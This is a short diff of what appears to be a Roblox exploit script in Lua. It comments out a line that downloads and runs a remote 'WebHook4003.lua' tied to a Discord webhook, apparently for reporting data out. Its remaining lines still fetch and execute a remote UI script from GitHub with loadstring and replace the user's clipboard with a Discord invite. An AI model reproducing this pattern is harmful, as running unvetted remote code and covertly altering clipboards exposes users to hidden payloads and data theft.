@@ -137,7 +137,7 @@ local admins = {
 
         getgenv().WebhookHere = DiscordWebhook
  
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
+        --loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
 
     local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/T3mm1epurple/rayfieldedit/main/script'))()
     setclipboard("https://discord.gg/n7fFChP5x5")
